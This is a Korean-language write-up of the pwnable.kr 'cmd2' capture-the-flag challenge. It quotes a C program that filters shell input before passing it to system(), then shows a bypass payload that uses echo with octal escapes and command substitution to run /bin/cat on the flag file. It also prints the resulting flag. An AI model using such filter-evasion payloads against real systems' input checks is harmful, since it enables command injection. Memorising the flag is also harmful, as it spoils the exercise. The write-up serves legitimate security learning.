# cmd2 - 9 pt

```text
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
```

## cmd2.c

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```

`cmd1`문제와 같이 입력받는 `argv[1]`을 `system()`으로 실행을 한다.
그러나 `PATH`환경변수 및 다른 환경변수도 `memset`으로 초기화되고, 입력값에 필터를 둬서 어떻게든 `flag`를 보지 못하게 막고 있다. 막는 문자열은 `=`, `PATH`, `export`, `/`, `flag` 그리고 `backtick`(`) 이다.

## 아이디어

`echo` 명령어는 ASCII 값을 8진수로 받는다. 이걸 이용해보자

현재 `/`를 입력 문자열에서 필터링 하기 때문에 절대경로로 사용할 파일을 지정할 수가 없다. `echo` 명령어로 8진수로 `/`를 출력하게 하고 그걸 다시 명령어로 사용해 보자.

1. echo "\57bin\57cat"
2. $(echo "\57bin\57cat")
3. $(echo "\57bin\57cat") f*

다음과 같이 입력값을 구성한다. 먼저 위에서 언급했듯이 `echo`로 필터링에 걸리지 않고 `/bin/cat`을 입력한다. 그리고 `$()`로 command substitution을 해서 `echo`로 출력한 값을 명령어로 재사용한다. `f*`로 flag 파일을 명시하면 끝!

[이 친구가 아이디어를 줬습니다 (하트찡긋)](http://einai.tistory.com/entry/%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4-pwnablekr-cmd2)

[그리고 이 친구를 좀 오랜시간동안 봤습니다](https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html#Bourne-Shell-Builtins)

## 풀자

```text
cmd2@ubuntu:~$ ./cmd2 '$(echo "\57bin\57cat") f*'
$(echo "\57bin\57cat") f*
FuN_w1th_5h3ll_v4riabl3s_haha
```